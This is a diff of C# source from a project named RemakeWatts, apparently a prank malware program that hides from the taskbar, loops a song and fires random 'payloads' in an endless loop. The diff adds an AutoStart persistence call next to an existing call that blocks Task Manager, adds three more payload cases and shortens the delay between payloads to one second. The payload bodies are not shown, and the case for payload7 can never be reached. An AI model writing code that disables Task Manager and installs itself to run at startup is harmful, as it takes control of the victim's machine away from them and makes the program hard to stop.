@@ -30,25 +30,25 @@ namespace RemakeWatts
             this.StartPosition = FormStartPosition.Manual;
             this.Location = new Point(x, y);
             this.ShowInTaskbar = false;
-
             InitializeComponent();
             new Thread(() =>
             {
-                SoundPlayer player = new SoundPlayer(Properties.Resources.Vicetone__Tony_Igy___Astronomia_2014);
+                SoundPlayer player = new SoundPlayer(Properties.Resources.Cypis___Putin);
                 player.PlayLooping();
             }).Start();
             RandomPayload();
         }
-
+        //losowanie payloda
         public void RandomPayload()
         {
             Payload payload = new Payload();
-            payload.BlockTaskMngr(); 
+            payload.BlockTaskMngr();
+            payload.AutoStart();
             while(true)
             {
                 Random random = new Random();
                 
-                int x = random.Next(1, 5);
+                int x = random.Next(1, 7);
                 switch(x)
                 {
                     case 1:
@@ -63,8 +63,17 @@ namespace RemakeWatts
                     case 4:
                         payload.payload4();
                         break;
+                    case 5:
+                        payload.payload5();
+                        break;
+                    case 6:
+                        payload.payload6();
+                        break;
+                    case 7:
+                        payload.payload7();
+                        break;
                 }
-                Thread.Sleep(10000);
+                Thread.Sleep(1000);
             }
         }
 
